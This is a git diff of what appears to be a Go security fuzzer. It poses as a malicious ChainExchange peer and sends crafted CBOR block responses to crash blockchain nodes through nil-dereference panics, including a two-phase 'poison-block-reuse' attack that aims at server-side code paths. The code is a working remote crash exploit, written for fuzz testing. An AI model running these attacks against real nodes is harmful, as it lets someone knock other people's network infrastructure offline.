@@ -13,7 +13,7 @@ import (
 )
 
 // ---------------------------------------------------------------------------
-// ChainExchange Server Attacks (21 mutations)
+// ChainExchange Server Attacks
 //
 // Pattern: Fuzzer acts as a malicious ChainExchange server.
 // 1. Create fresh host, register malicious exchange handler
@@ -23,60 +23,62 @@ import (
 // 5. Our handler responds with mutated data → potential crash
 // ---------------------------------------------------------------------------
 
-// responseMutation defines a single server-side attack.
 type responseMutation struct {
 	id      string
-	builder func() []byte // returns the full CBOR Response bytes
+	builder func(baseOpts blockHeaderOpts) []byte
 }
 
-// getAllExchangeServerAttacks returns all ChainExchange server attack vectors.
 func getAllExchangeServerAttacks() []namedAttack {
-	mutations := []responseMutation{
-		{"R01-nil-ticket", respNilTicket},
-		{"R02-nil-election-proof", respNilElectionProof},
-		{"R03-nil-bls-aggregate", respNilBLSAggregate},
-		{"R04-nil-block-sig", respNilBlockSig},
-		{"R05-nil-beacon-entries", respNilBeaconEntries},
-		{"R06-empty-beacon-entries", respEmptyBeaconEntries},
-		{"R07-nil-block-in-array", respNilBlockInArray},
-		{"R08-nil-bls-message", respNilBlsMessage},
-		{"R09-nil-secpk-message", respNilSecpkMessage},
-		{"R10-nil-secpk-signature", respNilSecpkSignature},
-		{"R11-oob-bls-index", respOOBBlsIndex},
-		{"R12-oob-secpk-index", respOOBSecpkIndex},
-		{"R13-nil-compacted-msgs", respNilCompactedMsgs},
-		{"R14-empty-chain-ok", respEmptyChainOk},
-		{"R15-duplicate-blocks", respDuplicateBlocks},
-		{"R16-unknown-status", respUnknownStatus},
-		{"R17-mismatched-includes", respMismatchedIncludes},
-		{"R18-more-tipsets-than-req", respMoreTipsetsThanReq},
-		{"R19-nil-parents", respNilParents},
-		{"R20-empty-parents", respEmptyParents},
-		{"R21-all-nil-fields", respAllNilFields},
-		// Multi-block tipset attacks — these require 2+ blocks with shared
-		// parents/height to trigger sort paths in NewTipSet().
-		{"R22-nil-ticket-multiblock", respNilTicketMultiBlock},
-		{"R23-both-nil-tickets", respBothNilTickets},
-		{"R24-nil-electionproof-multiblock", respNilElectionProofMultiBlock},
-	}
+	// Server-side attacks only — these hit paths WITHOUT recover().
+	// Removed client-side multiblock mutations (nil-ticket, both-nil-tickets,
+	// nil-electionproof) since they all hit the known recover() at
+	// exchange/client.go:167.
+	var result []namedAttack
 
-	result := make([]namedAttack, len(mutations))
-	for i, m := range mutations {
-		m := m // capture
-		result[i] = namedAttack{
-			name: m.id,
+	result = append(result,
+		namedAttack{
+			name: "poison-block-reuse",
 			fn: func() {
 				target := rngChoice(targets)
-				runExchangeServerAttack(ctx, target, m)
+				runPoisonBlockReuse(ctx, target)
 			},
-		}
-	}
+		},
+		namedAttack{
+			name: "split-fetch-nil-secpk",
+			fn: func() {
+				target := rngChoice(targets)
+				runSplitFetchNilSecpk(ctx, target)
+			},
+		},
+		namedAttack{
+			name: "random-nil-fields",
+			fn: func() {
+				target := rngChoice(targets)
+				runRandomNilFields(ctx, target)
+			},
+		},
+	)
 	return result
 }
 
 // runExchangeServerAttack executes a single server-side attack.
 func runExchangeServerAttack(ctx context.Context, target TargetNode, mut responseMutation) {
-	// Fresh host for each server attack (needs unique identity for Hello)
+	headInfo := fetchChainHead(target.Name)
+	if headInfo == nil {
+		debugLog("[%s] cannot fetch chain head for %s, skipping", mut.id, target.Name)
+		return
+	}
+
+	baseOpts := blockHeaderOpts{
+		overrideParentCIDs: headInfo.CIDs,
+		overrideHeight:     headInfo.Height + 1,
+		overrideWeight:     999999999,
+	}
+
+	resp := mut.builder(baseOpts)
+	triggerBlock := buildBlockHeaderCBOR(baseOpts)
+	triggerCID := blockCIDFromCBOR(triggerBlock)
+
 	h, err := pool.GetFresh(ctx)
 	if err != nil {
 		log.Printf("[%s] create host failed: %v", mut.id, err)
@@ -86,13 +88,9 @@ func runExchangeServerAttack(ctx context.Context, target TargetNode, mut respons
 
 	served := make(chan struct{}, 1)
 
-	// Register malicious ChainExchange handler
 	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
 		defer s.Close()
-		// Read and discard the request
 		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
-		// Respond with mutated data
-		resp := mut.builder()
 		s.Write(resp)
 		select {
 		case served <- struct{}{}:
@@ -100,15 +98,12 @@ func runExchangeServerAttack(ctx context.Context, target TargetNode, mut respons
 		}
 	})
 
-	// Register minimal Hello handler (victim sends us Hello on connect)
 	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
 		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
-		// Respond with minimal LatencyMessage [TArrival=0, TSent=0]
 		s.Write(cborArray(cborInt64(0), cborInt64(0)))
 		s.Close()
 	})
 
-	// Connect to target
 	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
 	defer cancel()
 	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
@@ -116,10 +111,15 @@ func runExchangeServerAttack(ctx context.Context, target TargetNode, mut respons
 		return
 	}
 
-	// Send Hello claiming heavier chain → victim will fetch from us
-	sendTriggerHello(ctx, h, target.AddrInfo.ID)
+	genesis := parseGenesisCID()
+	payload := buildHelloMessage(
+		[]cid.Cid{triggerCID},
+		headInfo.Height+1,
+		999999999,
+		genesis,
+	)
+	sendHelloPayload(ctx, h, target.AddrInfo.ID, payload)
 
-	// Wait for our handler to be called (or timeout)
 	select {
 	case <-served:
 		debugLog("[%s] malicious response served to %s", mut.id, target.Name)
@@ -128,9 +128,7 @@ func runExchangeServerAttack(ctx context.Context, target TargetNode, mut respons
 	}
 }
 
-// sendTriggerHello sends a Hello message to the target claiming a heavier
-// chain. This triggers the victim to call FetchTipSet → ChainExchange to us.
-func sendTriggerHello(ctx context.Context, h host.Host, targetPeer peer.ID) {
+func sendHelloPayload(ctx context.Context, h host.Host, targetPeer peer.ID, payload []byte) {
 	streamCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
 	defer cancel()
 
@@ -141,288 +139,277 @@ func sendTriggerHello(ctx context.Context, h host.Host, targetPeer peer.ID) {
 	}
 	defer s.Close()
 
-	genesis := parseGenesisCID()
-
-	// Claim a tipset with random CID at high height with large weight
-	payload := buildHelloMessage(
-		[]cid.Cid{randomCID()},
-		100000,        // high height
-		999999999,     // large weight
-		genesis,
-	)
 	s.Write(payload)
 	s.CloseWrite()
-
-	// Read and discard the LatencyMessage response
 	io.Copy(io.Discard, io.LimitReader(s, 1024))
 }
 
 // ---------------------------------------------------------------------------
-// Response mutation builders — each returns complete CBOR Response bytes
+// Response helpers
 // ---------------------------------------------------------------------------
 
-// validBlockCBOR returns a structurally valid BlockHeader for use in responses.
-func validBlockCBOR() []byte {
-	return buildBlockHeaderCBOR(blockHeaderOpts{})
+func mergeOpts(base blockHeaderOpts, mutation blockHeaderOpts) blockHeaderOpts {
+	mutation.overrideParentCIDs = base.overrideParentCIDs
+	mutation.overrideHeight = base.overrideHeight
+	mutation.overrideWeight = base.overrideWeight
+	return mutation
 }
 
-// validBSTipSetCBOR returns a valid BSTipSet with one block and empty messages.
-func validBSTipSetCBOR() []byte {
-	return buildBSTipSetCBOR(
-		[][]byte{validBlockCBOR()},
-		buildEmptyCompactedMsgsCBOR(),
-	)
-}
-
-// okResponse wraps a chain of BSTipSets into a status=0 (Ok) Response.
 func okResponse(chain ...[]byte) []byte {
 	return buildResponseCBOR(0, "", chain)
 }
 
-// R1: Block with Ticket = nil → Ticket.Less() panics on sort
-func respNilTicket() []byte {
-	blk := buildBlockHeaderCBOR(blockHeaderOpts{nilTicket: true})
-	ts := buildBSTipSetCBOR([][]byte{blk}, buildEmptyCompactedMsgsCBOR())
-	return okResponse(ts)
-}
-
-// R2: Block with ElectionProof = nil → WinCount access panics
-func respNilElectionProof() []byte {
-	blk := buildBlockHeaderCBOR(blockHeaderOpts{nilElectionProof: true})
-	ts := buildBSTipSetCBOR([][]byte{blk}, buildEmptyCompactedMsgsCBOR())
-	return okResponse(ts)
-}
-
-// R3: Block with BLSAggregate = nil → aggregate verification panics
-func respNilBLSAggregate() []byte {
-	blk := buildBlockHeaderCBOR(blockHeaderOpts{nilBLSAggregate: true})
-	ts := buildBSTipSetCBOR([][]byte{blk}, buildEmptyCompactedMsgsCBOR())
-	return okResponse(ts)
-}
-
-// R4: Block with BlockSig = nil → signature verification panics
-func respNilBlockSig() []byte {
-	blk := buildBlockHeaderCBOR(blockHeaderOpts{nilBlockSig: true})
-	ts := buildBSTipSetCBOR([][]byte{blk}, buildEmptyCompactedMsgsCBOR())
-	return okResponse(ts)
-}
-
-// R5: Block with BeaconEntries = nil
-func respNilBeaconEntries() []byte {
-	blk := buildBlockHeaderCBOR(blockHeaderOpts{nilBeaconEntries: true})
-	ts := buildBSTipSetCBOR([][]byte{blk}, buildEmptyCompactedMsgsCBOR())
-	return okResponse(ts)
-}
-
-// R6: Block with BeaconEntries = [] (empty array)
-func respEmptyBeaconEntries() []byte {
-	// Default blockHeaderOpts already uses empty beacon entries
-	blk := validBlockCBOR()
-	ts := buildBSTipSetCBOR([][]byte{blk}, buildEmptyCompactedMsgsCBOR())
-	return okResponse(ts)
-}
-
-// R7: BSTipSet.Blocks contains a nil entry
-func respNilBlockInArray() []byte {
-	ts := buildBSTipSetCBOR([][]byte{cborNil()}, buildEmptyCompactedMsgsCBOR())
-	return okResponse(ts)
-}
-
-// R8: CompactedMessages.Bls contains nil → .Cid() on nil panics (Bug 2)
-func respNilBlsMessage() []byte {
-	blk := validBlockCBOR()
-	ts := buildBSTipSetCBOR([][]byte{blk}, buildNilBlsCompactedMsgsCBOR())
-	return okResponse(ts)
-}
-
-// R9: CompactedMessages.Secpk contains nil → .Cid() on nil panics (Bug 2 variant)
-func respNilSecpkMessage() []byte {
-	blk := validBlockCBOR()
-	ts := buildBSTipSetCBOR([][]byte{blk}, buildNilSecpkCompactedMsgsCBOR())
-	return okResponse(ts)
-}
-
-// R10: Secpk message with zero-value Signature
-func respNilSecpkSignature() []byte {
-	// Build a minimal SignedMessage with zero signature
-	// SignedMessage = [Message, Signature]
-	// Message = [Version, To, From, Nonce, Value, GasLimit, GasFeeCap, GasPremium, Method, Params]
-	// Use zero-address (f0) for To/From
-	zeroAddr := cborBytes([]byte{0x00, 0x00}) // f00 address
-	minMessage := cborArray(
-		cborUint64(0),       // Version
-		zeroAddr,            // To
-		zeroAddr,            // From
-		cborUint64(0),       // Nonce
-		cborBytes([]byte{}), // Value (BigInt empty = 0)
-		cborInt64(1000000),  // GasLimit
-		cborBytes(bigIntBytes(100000)), // GasFeeCap
-		cborBytes(bigIntBytes(1000)),   // GasPremium
-		cborUint64(0),       // Method
-		cborBytes([]byte{}), // Params
-	)
-	// Signature with type=0 (invalid) and empty data
-	zeroSig := cborArray(cborUint64(0), cborBytes([]byte{}))
-	signedMsg := cborArray(minMessage, zeroSig)
-
-	msgs := cborArray(
-		cborArray(),                                  // Bls: []
-		cborArray(cborArray()),                       // BlsIncludes: [[]]
-		cborArray(signedMsg),                         // Secpk: [signedMsg]
-		cborArray(cborArray(cborUint64(0))),           // SecpkIncludes: [[0]]
-	)
-
-	blk := validBlockCBOR()
-	ts := buildBSTipSetCBOR([][]byte{blk}, msgs)
-	return okResponse(ts)
-}
-
-// R11: BlsIncludes with out-of-bounds index
-func respOOBBlsIndex() []byte {
-	blk := validBlockCBOR()
-	ts := buildBSTipSetCBOR([][]byte{blk}, buildOOBBlsIndexMsgsCBOR())
-	return okResponse(ts)
-}
-
-// R12: SecpkIncludes with out-of-bounds index
-func respOOBSecpkIndex() []byte {
-	blk := validBlockCBOR()
-	ts := buildBSTipSetCBOR([][]byte{blk}, buildOOBSecpkIndexMsgsCBOR())
-	return okResponse(ts)
-}
-
-// R13: BSTipSet.Messages = null
-func respNilCompactedMsgs() []byte {
-	blk := validBlockCBOR()
-	ts := buildBSTipSetCBOR([][]byte{blk}, cborNil())
-	return okResponse(ts)
-}
-
-// R14: Status=Ok but Chain is empty
-func respEmptyChainOk() []byte {
-	return buildResponseCBOR(0, "", nil)
-}
-
-// R15: Same block twice in Blocks[] → NewTipSet sort with identical tickets
-func respDuplicateBlocks() []byte {
-	blk := validBlockCBOR()
-	ts := buildBSTipSetCBOR(
-		[][]byte{blk, blk},
-		buildEmptyCompactedMsgsCBOR(),
-	)
-	return okResponse(ts)
-}
-
-// R16: Unknown status code 999
-func respUnknownStatus() []byte {
-	return buildResponseCBOR(999, "unknown error", [][]byte{validBSTipSetCBOR()})
-}
-
-// R17: Mismatched includes length (3 entries for 1 block)
-func respMismatchedIncludes() []byte {
-	blk := validBlockCBOR()
-	ts := buildBSTipSetCBOR([][]byte{blk}, buildMismatchedIncludesMsgsCBOR())
-	return okResponse(ts)
-}
-
-// R18: More tipsets than requested (3 when typically 1)
-func respMoreTipsetsThanReq() []byte {
-	return okResponse(validBSTipSetCBOR(), validBSTipSetCBOR(), validBSTipSetCBOR())
-}
-
-// R19: Block with Parents = null
-func respNilParents() []byte {
-	blk := buildBlockHeaderCBOR(blockHeaderOpts{nilParents: true})
-	ts := buildBSTipSetCBOR([][]byte{blk}, buildEmptyCompactedMsgsCBOR())
-	return okResponse(ts)
-}
-
-// R20: Block with Parents = [] (empty)
-func respEmptyParents() []byte {
-	blk := buildBlockHeaderCBOR(blockHeaderOpts{emptyParents: true})
-	ts := buildBSTipSetCBOR([][]byte{blk}, buildEmptyCompactedMsgsCBOR())
-	return okResponse(ts)
-}
-
-// R21: Every pointer field nil simultaneously
-func respAllNilFields() []byte {
-	blk := buildBlockHeaderCBOR(blockHeaderOpts{allNil: true})
-	ts := buildBSTipSetCBOR([][]byte{blk}, buildEmptyCompactedMsgsCBOR())
-	return okResponse(ts)
-}
-
 // ---------------------------------------------------------------------------
-// Multi-block tipset attacks (Bug 1 exact reproduction)
-//
-// NewTipSet() only sorts when len(blocks) >= 2. The sort calls Ticket.Less()
-// which dereferences the Ticket pointer without nil check → panic.
-// Both blocks must share Parents + Height to form a valid tipset.
+// Multi-block tipset attacks — trigger NewTipSet() sort → nil deref panic
 // ---------------------------------------------------------------------------
 
-// buildMultiBlockMsgsCBOR returns CompactedMessages for a 2-block tipset.
 func buildMultiBlockMsgsCBOR() []byte {
 	return cborArray(
-		cborArray(),                            // Bls: []
-		cborArray(cborArray(), cborArray()),     // BlsIncludes: [[], []] — one per block
-		cborArray(),                            // Secpk: []
-		cborArray(cborArray(), cborArray()),     // SecpkIncludes: [[], []]
+		cborArray(),
+		cborArray(cborArray(), cborArray()),
+		cborArray(),
+		cborArray(cborArray(), cborArray()),
 	)
 }
 
-// R22: Two blocks in tipset, one with nil Ticket → NewTipSet sort → Ticket.Less(nil) → panic
-// This is the exact reproduction of Bug 1 (nil-ticket remote crash).
-func respNilTicketMultiBlock() []byte {
-	shared := newSharedBlockCIDs()
-
-	// Block A: valid ticket, miner f01000
-	blkA := buildBlockHeaderCBOR(blockHeaderOpts{
-		overrideCIDs:  shared,
-		overrideMiner: []byte{0x00, 0xe8, 0x07}, // f01000
-	})
-	// Block B: nil ticket, different miner f01001 (distinct CID)
-	blkB := buildBlockHeaderCBOR(blockHeaderOpts{
-		nilTicket:     true,
-		overrideCIDs:  shared,
-		overrideMiner: []byte{0x00, 0xe9, 0x07}, // f01001
-	})
-
-	ts := buildBSTipSetCBOR([][]byte{blkA, blkB}, buildMultiBlockMsgsCBOR())
-	return okResponse(ts)
+func respNilTicketMultiBlock(base blockHeaderOpts) []byte {
+	optsA := mergeOpts(base, blockHeaderOpts{overrideMiner: []byte{0x00, 0xe8, 0x07}})
+	optsB := mergeOpts(base, blockHeaderOpts{nilTicket: true, overrideMiner: []byte{0x00, 0xe9, 0x07}})
+	return okResponse(buildBSTipSetCBOR([][]byte{buildBlockHeaderCBOR(optsA), buildBlockHeaderCBOR(optsB)}, buildMultiBlockMsgsCBOR()))
 }
 
-// R23: Two blocks both with nil Ticket → sort comparison between two nils → panic
-func respBothNilTickets() []byte {
-	shared := newSharedBlockCIDs()
-
-	blkA := buildBlockHeaderCBOR(blockHeaderOpts{
-		nilTicket:     true,
-		overrideCIDs:  shared,
-		overrideMiner: []byte{0x00, 0xe8, 0x07},
-	})
-	blkB := buildBlockHeaderCBOR(blockHeaderOpts{
-		nilTicket:     true,
-		overrideCIDs:  shared,
-		overrideMiner: []byte{0x00, 0xe9, 0x07},
-	})
-
-	ts := buildBSTipSetCBOR([][]byte{blkA, blkB}, buildMultiBlockMsgsCBOR())
-	return okResponse(ts)
+func respBothNilTickets(base blockHeaderOpts) []byte {
+	optsA := mergeOpts(base, blockHeaderOpts{nilTicket: true, overrideMiner: []byte{0x00, 0xe8, 0x07}})
+	optsB := mergeOpts(base, blockHeaderOpts{nilTicket: true, overrideMiner: []byte{0x00, 0xe9, 0x07}})
+	return okResponse(buildBSTipSetCBOR([][]byte{buildBlockHeaderCBOR(optsA), buildBlockHeaderCBOR(optsB)}, buildMultiBlockMsgsCBOR()))
 }
 
-// R24: Two blocks, one with nil ElectionProof → WinCount access panic on comparison
-func respNilElectionProofMultiBlock() []byte {
-	shared := newSharedBlockCIDs()
+func respNilElectionProofMultiBlock(base blockHeaderOpts) []byte {
+	optsA := mergeOpts(base, blockHeaderOpts{overrideMiner: []byte{0x00, 0xe8, 0x07}})
+	optsB := mergeOpts(base, blockHeaderOpts{nilElectionProof: true, overrideMiner: []byte{0x00, 0xe9, 0x07}})
+	return okResponse(buildBSTipSetCBOR([][]byte{buildBlockHeaderCBOR(optsA), buildBlockHeaderCBOR(optsB)}, buildMultiBlockMsgsCBOR()))
+}
 
-	blkA := buildBlockHeaderCBOR(blockHeaderOpts{
-		overrideCIDs:  shared,
-		overrideMiner: []byte{0x00, 0xe8, 0x07},
+// ---------------------------------------------------------------------------
+// Two-phase attack: poison-block-reuse (server-side, no recover)
+// ---------------------------------------------------------------------------
+
+func runPoisonBlockReuse(ctx context.Context, target TargetNode) {
+	headInfo := fetchChainHead(target.Name)
+	if headInfo == nil {
+		debugLog("[poison-block-reuse] cannot fetch chain head for %s, skipping", target.Name)
+		return
+	}
+
+	h, err := pool.GetFresh(ctx)
+	if err != nil {
+		log.Printf("[poison-block-reuse] create host failed: %v", err)
+		return
+	}
+	defer h.Close()
+
+	poisonCBOR := buildBlockHeaderCBOR(blockHeaderOpts{
+		nilTicket:          true,
+		overrideParentCIDs: headInfo.CIDs,
+		overrideHeight:     headInfo.Height + 1,
+		overrideWeight:     999999999,
 	})
-	blkB := buildBlockHeaderCBOR(blockHeaderOpts{
-		nilElectionProof: true,
-		overrideCIDs:     shared,
-		overrideMiner:    []byte{0x00, 0xe9, 0x07},
+	poisonCID := blockCIDFromCBOR(poisonCBOR)
+
+	served := make(chan struct{}, 1)
+
+	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
+		defer s.Close()
+		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
+		s.Write(okResponse(buildBSTipSetCBOR([][]byte{poisonCBOR}, buildEmptyCompactedMsgsCBOR())))
+		select {
+		case served <- struct{}{}:
+		default:
+		}
 	})
 
-	ts := buildBSTipSetCBOR([][]byte{blkA, blkB}, buildMultiBlockMsgsCBOR())
-	return okResponse(ts)
+	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
+		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
+		s.Write(cborArray(cborInt64(0), cborInt64(0)))
+		s.Close()
+	})
+
+	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
+	defer cancel()
+	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
+		debugLog("[poison-block-reuse] connect failed: %v", err)
+		return
+	}
+
+	genesis := parseGenesisCID()
+	sendHelloPayload(ctx, h, target.AddrInfo.ID, buildHelloMessage(
+		[]cid.Cid{poisonCID}, headInfo.Height+1, 999999999, genesis,
+	))
+
+	select {
+	case <-served:
+		log.Printf("[poison-block-reuse] poison block planted on %s (height=%d, cid=%s)",
+			target.Name, headInfo.Height+1, poisonCID.String()[:16])
+	case <-time.After(15 * time.Second):
+		debugLog("[poison-block-reuse] timeout planting on %s", target.Name)
+		return
+	}
+
+	// Phase 2: trigger server-side NewTipSet with duplicate CIDs
+	streamCtx, streamCancel := context.WithTimeout(ctx, 10*time.Second)
+	defer streamCancel()
+	s, err := h.NewStream(streamCtx, target.AddrInfo.ID, exchangeProtocol)
+	if err != nil {
+		debugLog("[poison-block-reuse] phase 2 stream failed: %v", err)
+		return
+	}
+	defer s.Close()
+
+	s.Write(buildExchangeRequest([]cid.Cid{poisonCID, poisonCID}, 1, 1))
+	s.CloseWrite()
+	s.SetReadDeadline(time.Now().Add(10 * time.Second))
+	io.Copy(io.Discard, io.LimitReader(s, 64*1024))
+}
+
+// ---------------------------------------------------------------------------
+// Split fetch: serve nil Secpk in messages-only response
+// ---------------------------------------------------------------------------
+
+func runSplitFetchNilSecpk(ctx context.Context, target TargetNode) {
+	headInfo := fetchChainHead(target.Name)
+	if headInfo == nil {
+		debugLog("[split-fetch-nil-secpk] cannot fetch chain head for %s, skipping", target.Name)
+		return
+	}
+
+	h, err := pool.GetFresh(ctx)
+	if err != nil {
+		log.Printf("[split-fetch-nil-secpk] create host failed: %v", err)
+		return
+	}
+	defer h.Close()
+
+	blockCBOR := buildBlockHeaderCBOR(blockHeaderOpts{
+		overrideParentCIDs: headInfo.CIDs,
+		overrideHeight:     headInfo.Height + 1,
+		overrideWeight:     999999999,
+	})
+	blockCID := blockCIDFromCBOR(blockCBOR)
+
+	served := make(chan struct{}, 1)
+
+	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
+		defer s.Close()
+		reqData := make([]byte, 64*1024)
+		n, _ := io.ReadAtLeast(s, reqData, 1)
+		options := parseRequestOptions(reqData[:n])
+
+		var resp []byte
+		if options&1 != 0 {
+			resp = okResponse(buildBSTipSetCBOR([][]byte{blockCBOR}, nil))
+		} else if options&2 != 0 {
+			resp = okResponse(buildBSTipSetCBOR(nil, buildNilSecpkCompactedMsgsCBOR()))
+		} else {
+			resp = okResponse(buildBSTipSetCBOR([][]byte{blockCBOR}, buildEmptyCompactedMsgsCBOR()))
+		}
+
+		s.Write(resp)
+		select {
+		case served <- struct{}{}:
+		default:
+		}
+	})
+
+	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
+		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
+		s.Write(cborArray(cborInt64(0), cborInt64(0)))
+		s.Close()
+	})
+
+	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
+	defer cancel()
+	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
+		debugLog("[split-fetch-nil-secpk] connect failed: %v", err)
+		return
+	}
+
+	genesis := parseGenesisCID()
+	sendHelloPayload(ctx, h, target.AddrInfo.ID, buildHelloMessage(
+		[]cid.Cid{blockCID}, headInfo.Height+1, 999999999, genesis,
+	))
+
+	select {
+	case <-served:
+		debugLog("[split-fetch-nil-secpk] response served to %s", target.Name)
+	case <-time.After(30 * time.Second):
+		debugLog("[split-fetch-nil-secpk] timeout on %s", target.Name)
+	}
+}
+
+// ---------------------------------------------------------------------------
+// Random nil-field fuzzer (combinatorial search)
+// ---------------------------------------------------------------------------
+
+func runRandomNilFields(ctx context.Context, target TargetNode) {
+	mut := responseMutation{
+		id: "random-nil-fields",
+		builder: func(base blockHeaderOpts) []byte {
+			mutation := blockHeaderOpts{
+				nilTicket:        rngIntn(2) == 0,
+				nilElectionProof: rngIntn(2) == 0,
+				nilBLSAggregate:  rngIntn(2) == 0,
+				nilBlockSig:      rngIntn(2) == 0,
+				nilBeaconEntries: rngIntn(2) == 0,
+				nilParents:       rngIntn(3) == 0,
+				emptyParents:     rngIntn(4) == 0,
+			}
+
+			numBlocks := 1
+			if rngIntn(3) == 0 {
+				numBlocks = 2
+			}
+
+			msgVariant := rngIntn(6)
+			var blocks [][]byte
+			var msgs []byte
+
+			if numBlocks == 1 {
+				opts := mergeOpts(base, mutation)
+				if mutation.nilParents || mutation.emptyParents {
+					opts.overrideParentCIDs = nil
+				}
+				blocks = [][]byte{buildBlockHeaderCBOR(opts)}
+				switch msgVariant {
+				case 0:
+					msgs = buildEmptyCompactedMsgsCBOR()
+				case 1:
+					msgs = buildNilSecpkCompactedMsgsCBOR()
+				case 2:
+					msgs = buildNilBlsCompactedMsgsCBOR()
+				case 3:
+					msgs = buildOOBBlsIndexMsgsCBOR()
+				case 4:
+					msgs = buildOOBSecpkIndexMsgsCBOR()
+				case 5:
+					msgs = cborNil()
+				}
+			} else {
+				optsA := mergeOpts(base, mutation)
+				optsA.overrideMiner = []byte{0x00, 0xe8, 0x07}
+				optsB := mergeOpts(base, blockHeaderOpts{
+					nilTicket:        rngIntn(2) == 0,
+					nilElectionProof: rngIntn(2) == 0,
+					nilBLSAggregate:  rngIntn(2) == 0,
+					nilBlockSig:      rngIntn(2) == 0,
+					nilBeaconEntries: rngIntn(2) == 0,
+					overrideMiner:    []byte{0x00, 0xe9, 0x07},
+				})
+				blocks = [][]byte{buildBlockHeaderCBOR(optsA), buildBlockHeaderCBOR(optsB)}
+				msgs = buildMultiBlockMsgsCBOR()
+			}
+
+			return okResponse(buildBSTipSetCBOR(blocks, msgs))
+		},
+	}
+	runExchangeServerAttack(ctx, target, mut)
 }
